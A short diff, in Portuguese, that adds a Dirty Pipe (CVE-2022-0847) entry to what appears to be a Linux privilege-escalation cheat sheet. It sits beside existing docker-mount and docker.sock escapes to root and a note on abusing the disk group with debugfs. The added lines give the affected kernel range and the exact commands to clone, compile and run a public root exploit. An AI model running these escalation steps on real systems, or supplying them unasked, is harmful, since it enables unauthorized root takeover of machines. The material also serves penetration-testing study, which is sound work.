@@ -244,6 +244,14 @@ docker run -v /root:/mnt -it ubuntu  (Este comando cria uma nova instância do D
 # Usando o arquivo docker.sock para virar root (geralmente em /var/run)
 docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
 
+# Dirty Pipe (permite gravação não autorizada em arquivos de usuário root no Linux)
+Todos os kernels da versão 5.8 para 5.17 são afetados e vulneráveis a esta vulnerabilidade.
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits
+bash compile.sh
+./exploit-1 ou ./exploit-2
+
+
 # Grupo DISK
  Um invasor com esses privilégios pode usar debugfspara acessar todo o sistema de arquivos com privilégios de nível raiz.
 
